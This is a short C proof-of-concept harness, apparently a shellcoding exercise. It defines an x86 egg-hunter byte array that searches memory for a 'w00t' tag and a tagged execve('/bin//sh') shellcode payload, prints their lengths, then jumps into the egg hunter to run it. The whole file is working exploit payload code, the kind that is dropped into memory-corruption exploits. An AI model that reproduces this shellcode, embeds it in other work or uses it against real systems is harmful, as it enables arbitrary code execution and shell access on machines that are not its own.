/* Shellcode PoC */

#include<stdio.h>
#include<string.h>

unsigned char egg_hunter[]=\
"\xeb\x16\x58\x40\x81\x78\xf8\x77\x30\x30\x74\x75\xf6\x81\x78\xfc\x77\x30\x30\x74\x75\xed\xff\xe0\xe8\xe5\xff\xff\xff";


unsigned char code[]=\
"\x77\x30\x30\x74\x77\x30\x30\x74\x31\xc0\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x53\x89\xe2\xb0\x0b"
"\xcd\x80";


main()
{
printf("Length of egg_hunter is %d\n",strlen(egg_hunter));

printf("Length of shellcode is %d\n",strlen(code));

(*(void  (*)()) egg_hunter)();

return 0;

}


	
